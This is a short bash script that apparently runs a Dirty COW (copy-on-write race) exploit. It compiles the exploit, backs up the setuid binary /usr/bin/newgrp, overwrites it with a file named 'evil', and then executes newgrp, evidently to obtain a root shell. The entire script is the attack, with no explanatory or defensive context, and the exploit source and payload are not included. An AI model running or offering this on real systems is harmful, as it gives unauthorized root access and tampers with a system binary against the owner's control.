#!/bin/bash
./compile.sh
cp /usr/bin/newgrp .
./dirtycow /usr/bin/newgrp evil
newgrp
